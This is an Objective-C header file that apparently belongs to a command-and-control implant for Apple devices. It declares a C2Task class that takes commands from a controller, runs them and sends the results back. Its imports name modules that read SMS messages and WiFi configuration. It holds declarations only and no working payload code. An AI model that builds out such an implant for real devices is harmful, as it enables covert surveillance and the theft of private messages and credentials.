#import <Foundation/Foundation.h>

#import "../c2_profiles/HTTPC2Config.h"
#import "../c2/C2CheckIn.h"
#import "../bridge/NSTask.h"
#import "../system_info/SystemInfoHelper.h"
#import "../modules/sms/SMSReader.h"
#import "../modules/wifi/WiFiConfigReader.h"

@interface C2Task : NSObject

@property (nonatomic, strong) NSString *taskID;
@property (nonatomic, strong) NSString *command;
@property (nonatomic, strong) NSString *parameters;
@property (nonatomic, assign) NSTimeInterval timestamp;

- (instancetype)initWithDictionary:(NSDictionary *)dict;
- (void)executeTask;
- (void)submitTaskResponseWithOutput:(NSString *)output status:(NSString *)status completed:(BOOL)completed;

@end
